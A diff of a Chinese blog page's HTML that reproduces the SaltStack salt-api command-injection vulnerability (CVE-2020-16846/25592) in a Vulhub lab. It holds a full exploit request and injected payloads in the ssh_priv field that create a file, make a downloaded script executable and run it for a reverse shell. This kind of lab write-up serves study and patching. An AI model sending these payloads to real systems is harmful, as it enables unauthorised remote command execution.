@@ -127,7 +127,7 @@
             <section class="inner">
                 <section class="inner-main">
                     <div class="post">
-    <article id="post-ckwhbya12000bs04z4j6i5sfy" class="article article-type-post" itemscope
+    <article id="post-ckwrjlyfv000bys4z9wmr4zir" class="article article-type-post" itemscope
     itemprop="blogPost">
 
     <div class="article-inner">
@@ -170,7 +170,7 @@
 
             
             <div class="article-busuanzi">
-                有 <span id="busuanzi_value_page_pv">N</span> 人看过
+                    有 <span id="busuanzi_value_page_pv">N</span> 人看过
             </div>
             
 
@@ -179,22 +179,41 @@
         <div class="article-entry post-inner-html hairline" itemprop="articleBody">
             <h2 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h2><p> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SaltStack是由thomas Hatch于2011年创建的一个开源项目，设计初衷是为了实现一个快速的远程执行系统。主要用于解决系统管理员日常会进行大量的重复性操作，例如安装软件，修改配置文件，创建用户，批量执行命令等等这些问题。<span id="more"></span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-2020-16846/25592组合使用可在未授权的情况下通过salt-api接口执行任意命令。CVE-2020-25592允许任意用户调用SSH模块，CVE-2020-16846允许用户执行任意命令。salt-api虽不是默认开启配置，但绝大多数SaltStack用户会选择开启salt-api，故存在较高风险。</p>
 <h2 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h2><p>Vulhub:<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/saltstack/CVE-2020-16846">https://github.com/vulhub/vulhub/tree/master/saltstack/CVE-2020-16846</a><br>下载</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash">git pull https://github.com/vulhub/vulhub.git</code></pre>
 <p>进入相关目录</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> saltstack/CVE-2020-16846/</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash"><span class="hljs-built_in">cd</span> saltstack/CVE-2020-16846/</code></pre>
 <p>启动容器</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash">docker-compose up -d</code></pre>
 <p>查看启动的容器ID，获取容器ID，8cd</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID        IMAGE                   COMMAND                  CREATED             STATUS              PORTS                                                                            NAMES</span><br><span class="line">8cd55a7b3eca        vulhub/saltstack:3002   <span class="string">&quot;/usr/bin/dumb-init …&quot;</span>   4 hours ago         Up 4 hours          0.0.0.0:4505-4506-&gt;4505-4506/tcp, 0.0.0.0:8000-&gt;8000/tcp, 0.0.0.0:2222-&gt;22/tcp   cve202016846_saltstack_1</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash">[root@localhost ~]<span class="hljs-comment"># docker ps</span>
+CONTAINER ID        IMAGE                   COMMAND                  CREATED             STATUS              PORTS                                                                            NAMES
+8cd55a7b3eca        vulhub/saltstack:3002   <span class="hljs-string">&quot;/usr/bin/dumb-init …&quot;</span>   4 hours ago         Up 4 hours          0.0.0.0:4505-4506-&gt;4505-4506/tcp, 0.0.0.0:8000-&gt;8000/tcp, 0.0.0.0:2222-&gt;22/tcp   cve202016846_saltstack_1</code></pre>
 
 <p>进入启动的docker，8cd为获取的容器ID（可以不补全）</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it 8cd /bin/bash</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> -it 8cd /bin/bash</code></pre>
 
-<h2 id="三、POC测试"><a href="#三、POC测试" class="headerlink" title="三、POC测试"></a>三、POC测试</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /run HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">43.180</span>:<span class="number">8000</span></span><br><span class="line">Connection: close</span><br><span class="line">Cache<span class="literal">-Control</span>: max<span class="literal">-age</span>=<span class="number">0</span></span><br><span class="line">Upgrade<span class="literal">-Insecure</span><span class="literal">-Requests</span>: <span class="number">1</span></span><br><span class="line">User<span class="literal">-Agent</span>: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">60.0</span>.<span class="number">3112.113</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed<span class="literal">-exchange</span>;v=b3;q=<span class="number">0.9</span></span><br><span class="line">Sec<span class="literal">-Fetch</span><span class="literal">-Site</span>: none</span><br><span class="line">Sec<span class="literal">-Fetch</span><span class="literal">-Mode</span>: navigate</span><br><span class="line">Sec<span class="literal">-Fetch</span><span class="literal">-User</span>: ?<span class="number">1</span></span><br><span class="line">Sec<span class="literal">-Fetch</span><span class="literal">-Dest</span>: document</span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate</span><br><span class="line">Accept<span class="literal">-Language</span>: zh<span class="literal">-CN</span>,zh;q=<span class="number">0.9</span></span><br><span class="line">Content<span class="literal">-Type</span>: application/x<span class="literal">-www</span><span class="literal">-form</span><span class="literal">-urlencoded</span></span><br><span class="line">Content<span class="literal">-Length</span>: <span class="number">87</span></span><br><span class="line"></span><br><span class="line">token=<span class="number">12312</span>&amp;client=ssh&amp;tgt=*&amp;fun=a&amp;roster=whip1ash&amp;ssh_priv=aaa|touch%<span class="number">20</span>/tmp/success%<span class="number">3</span>b</span><br></pre></td></tr></table></figure>
+<h2 id="三、POC测试"><a href="#三、POC测试" class="headerlink" title="三、POC测试"></a>三、POC测试</h2><pre><code class="hljs powershell">POST /run HTTP/<span class="hljs-number">1.1</span>
+Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">43.180</span>:<span class="hljs-number">8000</span>
+Connection: close
+Cache<span class="hljs-literal">-Control</span>: max<span class="hljs-literal">-age</span>=<span class="hljs-number">0</span>
+Upgrade<span class="hljs-literal">-Insecure</span><span class="hljs-literal">-Requests</span>: <span class="hljs-number">1</span>
+User<span class="hljs-literal">-Agent</span>: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">60.0</span>.<span class="hljs-number">3112.113</span> Safari/<span class="hljs-number">537.36</span>
+Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0.8</span>,application/signed<span class="hljs-literal">-exchange</span>;v=b3;q=<span class="hljs-number">0.9</span>
+Sec<span class="hljs-literal">-Fetch</span><span class="hljs-literal">-Site</span>: none
+Sec<span class="hljs-literal">-Fetch</span><span class="hljs-literal">-Mode</span>: navigate
+Sec<span class="hljs-literal">-Fetch</span><span class="hljs-literal">-User</span>: ?<span class="hljs-number">1</span>
+Sec<span class="hljs-literal">-Fetch</span><span class="hljs-literal">-Dest</span>: document
+Accept<span class="hljs-literal">-Encoding</span>: gzip, deflate
+Accept<span class="hljs-literal">-Language</span>: zh<span class="hljs-literal">-CN</span>,zh;q=<span class="hljs-number">0.9</span>
+Content<span class="hljs-literal">-Type</span>: application/x<span class="hljs-literal">-www</span><span class="hljs-literal">-form</span><span class="hljs-literal">-urlencoded</span>
+Content<span class="hljs-literal">-Length</span>: <span class="hljs-number">87</span>
+
+token=<span class="hljs-number">12312</span>&amp;client=ssh&amp;tgt=*&amp;fun=a&amp;roster=whip1ash&amp;ssh_priv=aaa|touch%<span class="hljs-number">20</span>/tmp/success%<span class="hljs-number">3</span>b</code></pre>
 <p>返回结果：<br><img src="https://img-blog.csdnimg.cn/20201223143856136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在容器内查看，成功创建success文件<br><img src="https://img-blog.csdnimg.cn/20201223144031170.png" alt="在这里插入图片描述"><br>尝试反弹shell，失败，还是老办法，wget下载了个<code>.sh</code>，要自己开个http服务：</p>
 <p><img src="https://img-blog.csdnimg.cn/2020122314521125.png" alt="在这里插入图片描述"></p>
 <p>里边写上反弹shell代码：<br><img src="https://img-blog.csdnimg.cn/20201223144353965.png" alt="在这里插入图片描述"><br>再赋权：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">token=12312&amp;client=ssh&amp;tgt=*&amp;fun=a&amp;roster=whip1ash&amp;ssh_priv=/|chmod%20777%20.sh%3b</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash">
+token=12312&amp;client=ssh&amp;tgt=*&amp;fun=a&amp;roster=whip1ash&amp;ssh_priv=/|chmod%20777%20.sh%3b</code></pre>
 <p>最后执行：<br><img src="https://img-blog.csdnimg.cn/20201223145535350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其实并不会成功，用<code>sh .sh</code>也不会成功，这里就不放图片了，其实该用的是<code>token=12312&amp;client=ssh&amp;tgt=*&amp;fun=a&amp;roster=whip1ash&amp;ssh_priv=/|/bin/bash%20.sh%3b</code><br><img src="https://img-blog.csdnimg.cn/20201223145846216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>很多时候可能不出网，导致无法反弹shell，可以使用DNSlog，Wget，Curl等方式<br><img src="https://img-blog.csdnimg.cn/202012231503451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p><img src="https://img-blog.csdnimg.cn/20201223150133741.png" alt="在这里插入图片描述"></p>
 <h2 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以下SaltStack版本存在补丁：</p>
